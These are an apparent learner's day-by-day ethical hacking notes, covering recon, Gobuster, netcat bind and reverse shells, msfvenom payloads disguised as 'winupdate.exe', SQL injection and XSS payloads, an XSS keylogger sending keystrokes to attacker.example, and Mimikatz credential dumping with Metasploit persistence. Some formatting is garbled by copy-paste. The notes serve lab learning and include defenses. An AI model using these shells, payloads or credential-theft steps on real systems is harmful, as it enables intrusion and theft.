# 🛡️ Day 2: Cyber Kill Chain, Reconnaissance & Ethical Hacking Phases

## 📌 1. Cyber Kill Chain Methodology

- **Reconnaissance**: Attacker gathers information about the target.
- **Weaponization**: Creation of malicious payload using collected data.
- **Delivery**: Sending the payload (email, USB, website).
- **Exploitation**: Triggering the payload using a system vulnerability.
- **Installation**: Installing malware/backdoor on the system.
- **Command & Control (C2)**: Remote communication/control by attacker.
- **Actions on Objectives**: Final goals like data theft or system takeover.

---

## 🔍 2. Introduction to Reconnaissance

Reconnaissance is the first step in both the Cyber Kill Chain and Ethical Hacking. It involves gathering intel about the target system.

**Types of Reconnaissance:**
- **Passive Reconnaissance**: No direct interaction (e.g., WHOIS, Google Dorks).
- **Active Reconnaissance**: Direct probing/scanning (e.g., Nmap, traceroute).

# 🛡️ Day 5 – Subdomain Enumeration and Firewalls Identifiers

## 📚 Topics Covered

### 🔹 Subdomain Enumeration

- **What is a Subdomain?**  
  A subdomain is a division of a main domain, used to organize or host specific services like `mail.example.com` or `blog.example.com`.

- **Definition of Subdomain Enumeration**  
  Subdomain enumeration is the process of identifying valid subdomains associated with a target domain. It is a crucial part of reconnaissance in ethical hacking as it uncovers potential entry points that are not visible on the main site.

- **Tools Used:**
  - **Subfinder**  
    Command:  
    ```bash
    subfinder -d org.com
    ```
  - **Online Tool**  
    Visit: [https://subdomainfinder.c99.nl](https://subdomainfinder.c99.nl)

---

### 🔹 Identifying Firewalls

- **What is a Firewall?**  
  A firewall is a network security system that monitors and filters traffic to and from a network. It helps protect against unauthorized access.

- **Tool Used:**
  - **wafw00f**  
    Command:  
    ```bash
    wafw00f https://org.com
    ```
    If it doesn't work, try:
    ```bash
    sudo wafw00f https://org.com
    ```
  🔎 Note: This tool may successfully detect firewalls for some domains but might fail for others depending on the WAF configuration.

---

## 📝 Observations

- Subdomain enumeration tools like Subfinder and online lookup services are effective in identifying exposed infrastructure.
- Firewall detection is sometimes limited by server-side settings and protection mechanisms.
- These tools are essential in the **Reconnaissance** phase of ethical hacking.

**Examples include:**
- Port Scanning
- OS Detection
- Service Enumeration
- Vulnerability Scanning

**Tools used:** Nmap, Netcat, Hping

---

## 📌 What are Ports?
Ports are virtual communication endpoints used to identify specific processes or network services.

| Port | Service         | Use                        |
|------|------------------|-----------------------------|
| 20   | FTP Data         | File transfer               |
| 21   | FTP Command      | FTP control                 |
| 22   | SSH              | Secure shell (remote login) |
| 25   | SMTP             | Email service               |
| 53   | DNS              | Domain name resolution      |
| 80   | HTTP             | Web (non-secure)            |
| 443  | HTTPS            | Web (secure)                |

---

## 🔗 What are Protocols?
- **TCP** – Connection-oriented, reliable
- **UDP** – Connectionless, faster but unreliable

---

## 🛠️ Nmap Tool Overview

Nmap (Network Mapper) is used for:
- Host discovery
- Port scanning
- OS & version detection
- Running vulnerability scripts

### ✅ Command we used:
```bash
sudo nmap -sS -sV -sC -O scanme.nmap.org
sudo nmap -A org.com
```


# 🛡️ Day 7 – Directory Bruteforcing 

---

## 🔍 What is a Directory?

In web applications, a **directory** is like a folder that stores web pages, configuration files, scripts, and other components. Some directories are hidden or not linked publicly, making them vulnerable if they contain sensitive data such as:
- Admin panels
- Backups
- Configuration files

Directory Bruteforcing helps uncover these hidden folders by trying many possible paths using a **wordlist**.

---

## 🛠️ Practical Steps

### ✅ Step 1: Start the Machine
We used the **"Vulnversity"** machine on [TryHackMe](https://tryhackme.com), copied the **target IP address**, e.g.:

```bash
http://10.10.188.89
🚀 Tool 1: Gobuster (for HTTP)
🔹 Command:
bash
Copy
Edit
gobuster dir -u http://10.10.188.89 -w /usr/share/seclists/Discovery/Web-Content/common.txt
🔹 Explanation:
Flag	Description
dir	Directory brute-force mode
-u	Target URL
-w	Path to the wordlist file

⚠️ If the wordlist path doesn't work, check:

bash
Copy
Edit
ls /usr/share/seclists/Discovery/Web-Content/
Or install Seclists:

bash
Copy
Edit
sudo apt install seclists
📄 Sample Output:
bash
Copy
Edit
/.htaccess (Status: 403)
/.hta       (Status: 403)
/admin      (Status: 301)
/uploads    (Status: 301)
403: Forbidden – file/folder exists but access is denied.

301: Moved Permanently – folder exists and can be accessed.

🔐 Gobuster HTTPS Limitation
Gobuster may fail with HTTPS URLs due to certificate or SSL issues. That’s why we switch to Feroxbuster for HTTPS scanning.

🚀 Tool 2: Feroxbuster (for HTTPS)
🔹 Command:
bash
Copy
Edit
feroxbuster --url https://10.10.188.89 -w /usr/share/seclists/Discovery/Web-Content/common.txt
✅ Why Feroxbuster?
Works well with HTTPS

Supports recursion

Automatically handles redirects

Easy and fast

🔧 Install it:
bash
Copy
Edit
sudo apt install feroxbuster
📂 Wordlist Location in Kali Linux
To find common wordlists:

bash
Copy
Edit
ls /usr/share/seclists/Discovery/Web-Content/
Or search directly:

bash
Copy
Edit
sudo find / -name "common.txt" 2>/dev/null

🧠 Summary
Tool	Protocol	Usage Purpose	Wordlist Path
Gobuster	HTTP	Fast directory bruteforcing	/usr/share/seclists/Discovery/Web-Content/common.txt
Feroxbuster	HTTPS	Secure brute-forcing	/usr/share/seclists/Discovery/Web-Content/common.txt

# 🛡️ Day 9 –  Finding Exploits

---

## 📌 Overview

After performing **port scanning** and **service detection** using tools like `nmap`, the next step in penetration testing is **identifying known vulnerabilities or exploits** for the services and software versions running on a target system. This process is often called **exploit enumeration**.

The goal is to map the discovered service/version to a known CVE (Common Vulnerabilities and Exposures) and find a corresponding **public exploit** to further investigate or weaponize.

---

## 🔧 Tools Used

| Tool         | Purpose                                                                 |
|--------------|-------------------------------------------------------------------------|
| `nmap`       | Port scanning and service version detection                             |
| Exploit-DB   | Public exploit database (offline & online)                              |
| Rapid7       | Online vulnerability research and exploit frameworks (e.g., Metasploit) |
| GitHub       | Open-source exploits and POCs                                            |
| `searchsploit` | Offline tool to search for public exploits locally                     |
| `mousepad`   | To view exploit code files                                               |

# Day 10 - Reverse Shell vs Bind Shell

### Explanation
- **Bind Shell**: The target machine opens a port and waits for the attacker to connect. This method requires the attacker to know the victim's IP address and is more likely to be blocked by firewalls.
- **Reverse Shell**: The target machine initiates a connection to the attacker's machine. This method is often used to bypass firewalls and doesn't require the attacker to know the victim's IP address.

### Comparison Table

| Feature | Bind Shell | Reverse Shell |
| --- | --- | --- |
| **Connection Initiation** | Attacker connects to a listening port on the target | Target machine initiates connection back to attacker |
| **Listener Location** | Listener runs on target machine | Listener runs on attacker's machine |
| **Common Use Cases** | Persistence & direct control | Initial access & bypassing firewalls |
| **Firewall Bypass** | More likely blocked by firewalls | Can bypass as target connects outward |
| **IP Requirement** | Attacker must know victim's IP | No need to know victim's IP |
| **Security Implications** | Exposes a port on target, making it vulnerable | Less exposure since connection is initiated by target |
| **Typical Protocols** | Often uses TCP/UDP directly | Often uses HTTP/S or common protocols to avoid detection |

## Topic 2: Payloads

### What is a Payload?
A **payload** is the part of malware or an exploit that performs the intended malicious action on the target system once a vulnerability is exploited. In penetration testing, payloads are often used to gain control, exfiltrate data, or open shells.

### Staged vs Non-Staged Payloads

#### **Staged Payload**:
- Delivered in parts: an initial "stager" sets up a connection and downloads the final payload.
- Smaller initial size, requires network connectivity for final payload.
- More complex but flexible.

#### **Non-Staged (Stageless) Payload**:
- Self-contained single executable with all functionalities.
- Larger size but operates independently without additional downloads.
- Simpler but less flexible.

### Comparison Table

| Feature | Staged Payload | Non-Staged (Stageless) Payload |
| --- | --- | --- |
| **Definition** | Multiple parts: stager + final payload | Self-contained, all-in-one |
| **Execution Process** | Requires stager to download payload | Executes in single step |
| **File Size** | Smaller initially | Larger since everything is included |
| **Complexity** | More complex due to multiple components | Simpler, single executable |
| **Network Dependency** | Needs connectivity to fetch payload | No additional network needed |
| **Stealth/Detection** | More detectable (multiple interactions) | Stealthier (less interaction) |

---

## Summary
- **Bind Shell** is more for persistence but easier to block.
- **Reverse Shell** is better for bypassing firewalls and stealth.
- **Staged Payloads** are modular and smaller initially but require network.
- **Non-Staged Payloads** are bigger but more self-sufficient.

# Day 11 – Practical with Metasploit

## 📌 Overview
This session covers a hands-on practice with **Metasploit** and **Netcat** to establish bind and reverse shells between **Kali Linux** (attacker) and **Metasploitable** (target). It also includes an explanation of **staged vs. stageless payloads**.

---

## 🛠 Steps Performed

### 1. Setting up Environment
- Started Kali Linux (attacker) and Metasploitable (target) in VirtualBox.
- Configured **NAT networking** so both can communicate.
- Used `ifconfig` to get IP addresses.
- Verified connection with `ping <target_ip>`.

### 2. Bind Shell
- **Target (Metasploitable)**:
  ```bash
  nc -lvnp 4444 -e /bin/bash
  ```
- **Attacker (Kali)**:
  ```bash
  nc -v <target_ip> 4444
  ```
- Once connected, commands like `whoami` can be run.

### 3. Reverse Shell
- **Attacker (Kali)**:
  ```bash
  nc -lvnp 4444
  ```
- **Target (Metasploitable)**:
  ```bash
  nc <attacker_ip> 4444 -e /bin/bash
  ```

### 4. Staged vs. Stageless Payloads
- **Staged**: Sent in two parts (stager + full payload).
  Example: `windows/meterpreter/reverse_tcp`
- **Stageless**: Sent all at once.
  Example: `windows/meterpreter_reverse_tcp`

#### Difference Table
| Feature        | Staged Payload                  | Stageless Payload             |
|---------------|--------------------------------|--------------------------------|
| Delivery      | Two parts                      | One part                       |
| Size          | Smaller initial code           | Larger total size              |
| Reliability   | Needs stable connection        | Works with unstable connections|
| Stealth       | More stealthy                  | Less stealthy                  |
| Example       | windows/meterpreter/reverse_tcp| windows/meterpreter_reverse_tcp|

### 5. Listing Payloads
```bash
msfvenom -l payloads
msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"
```
- Slash `/` before `reverse_tcp` → staged payload.
- Underscore `_` before `reverse_tcp` → stageless payload.

---

## 📚 Summary
- Connected Kali and Metasploitable using NAT.
- Practiced **bind** and **reverse** shells with Netcat.
- Learned differences between **staged** and **stageless** payloads.
- Understood how to identify payload types in Metasploit.

# Day 12 — Metasploit Framework Basics

This README provides a summary of the topics covered in Day 12 of the Ethical Hacking learning plan.

## 1. msfconsole
The **msfconsole** is the primary interactive command-line interface for the Metasploit Framework. It is used to search, configure, and execute modules.

## 2. Module Types
Metasploit includes various module types:
- **Exploit** — Code to exploit vulnerabilities.
- **Payload** — Code delivered after exploitation (e.g., Meterpreter).
- **Auxiliary** — Scanners, fuzzers, and brute-forcers.
- **Post** — Post-exploitation modules for persistence or data gathering.
- **Encoder** — Transforms payloads to avoid bad characters.
- **NOP** — Padding instructions for exploits.
- **Evasion** — Techniques to bypass detection.

## 3. Typical Workflow
1. `search <term>` — Find relevant modules.
2. `use <module-path>` — Load the module.
3. `show options` — View required settings.
4. `set <option> <value>` — Configure options.
5. `exploit` or `run` — Execute the module.

## 4. show evasion
Displays evasion options for supported modules to help avoid detection.

## 5. msfvenom Example
Example command:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-IP> LPORT=4444 -f exe -o windows_payloads.exe
```
- `-p` — Payload type.
- `LHOST` — Attacker IP.
- `LPORT` — Port for callback.
- `-f` — Output format.
- `-o` — Output file.

## 6. Starting a Listener
Use the `exploit/multi/handler` module:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your-IP>
set LPORT 4444
run
```
Always start the listener before executing the payload on the target.

## 7. Notes
- Staged payloads send a stager first, then the main payload.
- Stageless payloads contain everything in one stage.
- Encoders avoid bad characters but aren't guaranteed AV bypass.
- NOPs provide safe padding.
- Evasion modules may bypass some defenses.

---
**Disclaimer:** Use Metasploit only on systems you own or have explicit permission to test.


# Day 13 – Hacking with Metasploit

## 📌 Topics Covered
- Server-Side Exploits
- Client-Side Exploits
- Reconnaissance with Nmap
- Exploiting vulnerable services with Metasploit
- Creating payloads with msfvenom
- Handling sessions with multi/handler
- Serving payloads via Python HTTP server
- Security considerations

## 🖥 Server-Side Exploits
Server-side exploits target vulnerable services running on a server.  
Example workflow:
```bash
sudo nmap -sS -sV target_ip
sudo nmap -A target_ip
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST target_ip
run
```

## 💻 Client-Side Exploits
Client-side exploits target applications on the user's system and require victim interaction.  
Example workflow:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=8888 -f exe -o winupdate.exe

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 8888
run

python3 -m http.server 80
```

## 🔍 Key Differences
| Feature           | Server-Side Exploit                       | Client-Side Exploit                        |
|-------------------|-------------------------------------------|---------------------------------------------|
| Target            | Vulnerable service on a server            | Vulnerable application on client machine    |
| Initiation        | Attacker initiates remotely               | Victim executes/open malicious content      |
| User Interaction  | Not required                              | Required                                    |
| Example           | Exploiting Apache server                  | Sending malicious PDF                       |
| Risk              | Can compromise server infrastructure     | Limited to client system but can escalate   |

## ⚠️ Security Considerations
- Attacking without permission is illegal
- IDS/IPS can detect exploit attempts
- Social engineering is often required for client-side attacks
- Antivirus may detect payloads – encoding/obfuscation may be needed

# Day 14: Brute Force Attacks

## 📌 Overview
A brute-force attack is a technique used to discover valid credentials by systematically attempting many possible combinations. It can be performed **online** (directly against a live target) or **offline** (on stolen password hashes).

---

## 🔍 Online vs Offline Brute Force

| Aspect       | Online Brute Force                                                                 | Offline Brute Force |
|--------------|------------------------------------------------------------------------------------|---------------------|
| **Definition** | Attempts are sent directly to the live target (e.g., SSH, HTTP login).            | Performed on stolen/obtained password hashes locally. |
| **Speed**    | Slower due to network latency and rate limits.                                     | Faster with GPU acceleration. |
| **Stealth**  | Easier to detect (network logs, IDS alerts).                                       | Harder to detect; no live system interaction. |
| **Requirements** | Target service must be accessible.                                             | Requires database/hash dump first. |
| **Examples** | Testing SSH with many passwords.                                                   | Cracking bcrypt hashes with Hashcat. |

---

## 🛠 Types of Brute Force Attacks

| Attack Type         | Description |
|--------------------|-------------|
| **Simple Brute Force** | Tries all possible character combinations until the correct password is found. |
| **Dictionary Attack** | Uses a predefined list of common/leaked passwords. |
| **Hybrid Attack** | Mixes dictionary with variations (adding numbers, symbols, etc.). |
| **Credential Stuffing** | Reuses leaked username-password pairs from previous breaches. |
| **Password Spraying** | Tries a few common passwords across many accounts. |
| **Rainbow Table Attack** | Uses precomputed hash lookup tables; ineffective with salted hashes. |

---

## 🛡 Role of CAPTCHA
- Slows down or prevents automated login attempts.
- Not foolproof; attackers may bypass using ML or human-solving services.

---

## 🔧 Tools
- **Hydra** → Fast brute-force tool for multiple services (SSH, HTTP, FTP, etc.).
- **Burp Suite + FoxyProxy** → Captures and analyzes HTTP requests to craft attack payloads.

---

## 🧪 Safe Lab Workflow (Authorized Testing Only)
1. Confirm authorization.
2. Scan with **Nmap** to find open ports.
3. Capture login requests using **Burp Suite**.
4. Select appropriate attack method.
5. Run with low intensity.
6. Verify credentials manually.
7. Document results.

---

## 🛡 Defensive Measures
- Enforce **Multi-Factor Authentication (MFA)**.
- Use **strong password policies**.
- **Rate limiting** and **progressive delays**.
- **Account lockouts** after multiple failures.
- Implement **CAPTCHAs**.
- **Monitor authentication patterns**.
- Use **strong password hashing** with salts.

---
⚠ **Ethics Reminder:** Always have explicit permission before testing. Only practice in authorized labs like **TryHackMe** or **Hack The Box**.

```

# Day 16 – SQL Injection Attacks

## 📌 Overview
**SQL Injection (SQLi)** is a type of attack that allows an attacker to manipulate SQL queries executed by an application. It occurs when user input is improperly sanitized before being used in an SQL statement.

---

## 1. What is SQL?
**SQL (Structured Query Language)** is the standard language for managing and manipulating relational databases.  
Some common SQL commands:
- `SELECT` – Retrieve data
- `INSERT` – Add data
- `UPDATE` – Modify data
- `DELETE` – Remove data
- `CREATE` – Create tables/databases
- `DROP` – Delete tables/databases
---
Example:
sql
SELECT * FROM users WHERE username = 'admin';
2. What is SQL Injection?
---
SQL Injection occurs when an attacker inserts malicious SQL code into a query, altering its behavior.
If input fields are not properly sanitized, attackers can:
```
Bypass authentication

Retrieve sensitive data

Modify or delete database content

Execute administrative operations

In some cases, execute system commands

3. How is SQL Injection Performed?
Example vulnerable PHP code:
```
php

<?php
$username = $_GET['username'];
$password = $_GET['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
?>
If the user enters:

bash

' OR '1'='1
The SQL query becomes:

sql

SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
This will always return true, bypassing authentication

4. What Can a Successful SQL Injection Do?
    ---
Data Theft – Retrieve confidential data
---
Authentication Bypass – Login without valid credentials

Data Manipulation – Insert, update, or delete data

Privilege Escalation – Gain admin rights

Remote Code Execution – In severe cases

5. Types of SQL Injection
   ---
Classic (In-band) SQL Injection
---
Error-based – Using error messages to extract data

Union-based – Using UNION SELECT to fetch additional data

Blind SQL Injection

Boolean-based – True/false responses determine data

Time-based – Delays in response confirm data

Out-of-band SQL Injection

Data retrieved via DNS or HTTP requests

6. Practical Examples
6.1 Bypassing Authentication
   ---
Input in username field:

vbnet

admin' --+
Query becomes:

sql
Copy
Edit
SELECT * FROM users WHERE username = 'admin' --+' AND password = '';
The --+ comments out the rest of the query, bypassing the password check.

Another Example:

matlab

' OR '1'='1' --+
Query becomes:

sql

SELECT * FROM users WHERE username = '' OR '1'='1' --+ AND password = '';
6.2 UNION SQL Injection
---
Purpose: Combine results from multiple queries.
Example:

sql
Copy
Edit
SELECT username, password FROM users WHERE id = 1 UNION SELECT null, version();
This retrieves database version details.

6.3 Blind SQL Injection
---
Boolean-based:

sql

?id=1 AND 1=1
?id=1 AND 1=2
First returns a normal page, second returns an empty page.

Time-based:

sql
Copy
Edit
?id=1 AND IF(1=1, SLEEP(5), 0)
If the page delays by 5 seconds, condition is true.

7. Performing SQL Injection in PHP (Example)
Given a vulnerable URL:


http://target.com/page.php?id=1
Test by adding:


http://target.com/page.php?id=1'
If an SQL error appears, it’s vulnerable.
Then try:

?id=1 AND 1=1 --+
?id=1 AND 1=2 --+
If page output changes, SQLi confirmed.
---
8. SQLMap in Kali Linux
SQLMap is an automated SQL injection tool.

Install SQLMap
t
sudo apt update
sudo apt install sqlmap
Basic Usage
---
sqlmap -u "http://target.com/page.php?id=1" --dbs
Options:

--dbs – List databases

--tables -D <dbname> – List tables in a database

--columns -D <dbname> -T <table> – List columns

--dump -D <dbname> -T <table> – Dump table data

9. Burp Suite for SQL Injection

Burp Suite is a web security testing tool.
---
Install Burp Suite
bash
Copy
Edit
sudo apt update
sudo apt install burpsuite
Or download from:
https://portswigger.net/burp

Steps to Use for SQL Injection
Set browser proxy to 127.0.0.1:8080

Open Burp Suite → Proxy → Intercept ON

Capture request from target

Send to Intruder or Repeater

Modify parameters with payloads like:

lua
Copy
Edit
' OR '1'='1 --+
Analyze responses to detect injection points.

10. Why Use SQLMap & Burp Suite?
 ---
SQLMap: Automates the exploitation, faster results
---
Burp Suite: Manual testing, detailed control over requests

Combination: Use Burp to find injection points, SQLMap to exploit them

⚠️ Legal Disclaimer
This information is provided for educational purposes only.
Do not perform SQL injection attacks on systems you do not own or have permission to test.

# Day 17 — XSS (Cross-Site Scripting)

> Educational use only. Test only systems you own or have explicit permission to test.

## What is XSS?
XSS lets attackers inject JavaScript that runs in other users’ browsers due to improper input handling and output encoding. Impact includes session hijacking, data theft, keylogging, phishing, and defacement.

## Types
- **Stored XSS** — Payload stored server-side (DB, comments). Triggers when anyone views.
- **Reflected XSS** — Payload delivered in request and reflected immediately in response.
- **DOM XSS** — Client-side JS reads attacker-controlled data and writes it into the DOM insecurely.

## Quick Examples

### Reflected
```
https://vuln.example.com/search?q=%3Cscript%3Ealert('Reflected%20XSS')%3C/script%3E
```

### Stored
Comment payload:
```html
<script>alert('Stored XSS')</script>
<!-- or -->
<img src=x onerror=alert('Stored XSS')>
```

### DOM
Vulnerable code:
```js
document.getElementById('out').innerHTML = location.hash.substring(1);
```
Trigger:
```
https://vuln.example.com/#%3Cscript%3Ealert('DOM%20XSS')%3C/script%3E
```

## Useful Test Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<a href="javascript:alert('XSS')">click</a>
```

## Keylogger (Demo)
```html
<script>
document.addEventListener('keypress', e => {
  fetch('https://attacker.example/log?k='+encodeURIComponent(e.key));
});
</script>
```

## Methodology
1. Map inputs (forms, params, fragments).
2. Probe with harmless payloads.
3. Identify reflection/storage or DOM sinks.
4. Escalate impact in a safe lab (cookies, keylogging demo).
5. Document findings and propose mitigations.

## TryHackMe Practice
Use a dedicated XSS room or web fundamentals labs to practice reflected, stored, and DOM XSS in a safe environment. Reproduce alerts via URL/query/fragment; then demonstrate impact carefully.

## Prevention Cheat Sheet
- Context-aware output encoding.
- Avoid dangerous sinks; prefer `textContent` and DOM APIs.
- Validate/sanitize input (DOMPurify when needed).
- Cookies: `Secure`, `HttpOnly`, `SameSite`.
- Content Security Policy (CSP).
- Automated testing & security scanners.

# Day 18 – Dumping Hashes & Maintaining Persistence

## 🔹 Mimikatz – What is it?
Mimikatz is a post-exploitation tool developed by Benjamin Delpy.  
It is widely used for:
- Extracting plaintext passwords, hashes, PINs, and Kerberos tickets from memory.
- Performing pass-the-hash, pass-the-ticket, and Golden Ticket attacks.
- Gaining persistence inside Windows environments.

---

## 🔹 How Mimikatz Dumps Passwords
Windows stores login information in memory via the **LSASS (Local Security Authority Subsystem Service)** process.  
Mimikatz interacts with LSASS to extract credentials:
- Plaintext passwords
- NTLM hashes
- Kerberos tickets

**Example commands:**
```
privilege::debug
sekurlsa::logonpasswords
```

---

## 🔹 What is NTLM?
- **NTLM (NT LAN Manager)** is a Microsoft authentication protocol.
- Uses challenge-response mechanism and stores password hashes.
- The NTLM hash is a one-way hash representation of the password.

**Attackers can:**
- Crack hashes using tools/sites like hashcat, John the Ripper, crackstation.net.
- Use **Pass-the-Hash (PtH)** attacks to authenticate using hashes without knowing the plaintext password.

---

## 🔹 Using Mimikatz
Steps after compromise:
1. Run Mimikatz on the target system.
2. Check privileges:
   ```
   privilege::debug
   ```
3. Dump credentials:
   ```
   sekurlsa::logonpasswords
   ```

---

## 🔹 Relaying Hashes (Evil-WinRM Example)
If you extract a valid NTLM hash, you can authenticate remotely without the password.

**Example:**
```
evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
```

---

## 🔹 Persistence After Reboot
Once the machine restarts, your session dies. To maintain persistence:

```
background
sessions -l
sessions -i <number>
```

---

## 🔹 Persistence with Metasploit
Metasploit provides modules to maintain persistence:

```
use exploit/windows/local/persistence
set SESSION <session_id>
set LPORT 4444
set LHOST <your_ip>
exploit
```

---

## 🔹 Maintaining Access After Restart
1. Multihandler setup:
   ```
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT 4444
   exploit
   ```

2. After the victim restarts, the persistence payload reconnects back, and you regain a Meterpreter session.

---

## 🔹 Summary Workflow
1. Compromise target & upload Mimikatz.
2. Use `sekurlsa::logonpasswords` to dump credentials.
3. Crack or relay NTLM hashes (Evil-WinRM).
4. Background session (`sessions -l`, `sessions -i`).
5. Use persistence module (`exploit/windows/local/persistence`).
6. Set up a multi-handler listener.
7. After restart, regain session automatically.
